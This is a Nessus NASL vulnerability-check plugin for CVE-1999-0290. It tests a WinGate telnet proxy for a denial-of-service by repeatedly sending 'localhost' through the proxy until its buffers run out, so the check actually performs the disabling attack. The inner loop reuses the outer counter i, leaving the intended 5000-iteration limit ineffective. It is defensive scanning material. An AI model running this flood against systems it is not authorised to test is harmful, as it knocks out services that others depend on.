#
# (C) Tenable Network Security, Inc.
#

include( 'compat.inc' );

if(description)
{
 script_id(10310);
 script_version ("$Revision: 1.17 $");
 script_cve_id("CVE-1999-0290");
 script_xref(name:"OSVDB", value:"11506");

 script_name(english:"WinGate Telnet Proxy localhost Connection Saturation DoS");
 script_summary(english:"Determines if Wingate is vulnerable to a buffer attack");

  script_set_attribute(
    attribute:'synopsis',
    value:'The remote proxy is vulnerable to denial of service.'
  );

  script_set_attribute(
    attribute:'description',
    value:"The remote Wingate service
can be forced to connect to itself continually
until it runs out of buffers. When this happens,
the telnet proxy service will be disabled.

An attacker may block your telnet proxy this
way, thus preventing your system from working
properly if you need telnet. An attacker may also
use this flaw to force your systems to use another
proxy which may be under the attacker's control."
  );

  script_set_attribute(
    attribute:'solution',
    value: "Configure WinGate so that only authorized users can use it."
  );

  script_set_attribute(
    attribute:'see_also',
    value:'http://archives.neohapsis.com/archives/bugtraq/1998_1/0240.html'
  );

  script_set_attribute(
    attribute:'cvss_vector',
    value:'CVSS2#AV:N/AC:L/Au:N/C:N/I:N/A:P'
  );

  script_end_attributes();

  script_category(ACT_DENIAL);
  script_copyright(english:"This script is Copyright (C) 1999-2009 Tenable Network Security, Inc.");
  script_family(english:"Windows");
  script_dependencie("find_service1.nasl", "wingate.nasl");
  script_require_keys("wingate/enabled");
  script_require_ports("Services/telnet", 23);
  exit(0);
}

#
# The script code starts here
#

wingate = get_kb_item("wingate/enabled");
if(!wingate)exit(0);
port = get_kb_item("Services/telnet");
if(!port)port = 23;

if(get_port_state(port))soc = open_sock_tcp(port);
if(soc)
{
flaw = 0;
for(i=0;i<5000;i=i+1)
{
 buffer = recv(socket:soc, length:8);
 b = string("localhost\r\n");
 send(socket:soc, data:b);
 r = recv(socket:soc, length:1024);
 for(i=0;i<11;i=i+1)d = recv(socket:soc, length:1);
 r = recv(socket:soc, length:100);
 r = tolower(r);
 if(("buffer" >< r)){
	i = 5001;
	security_warning(port);
	}
  }
close(soc);
}
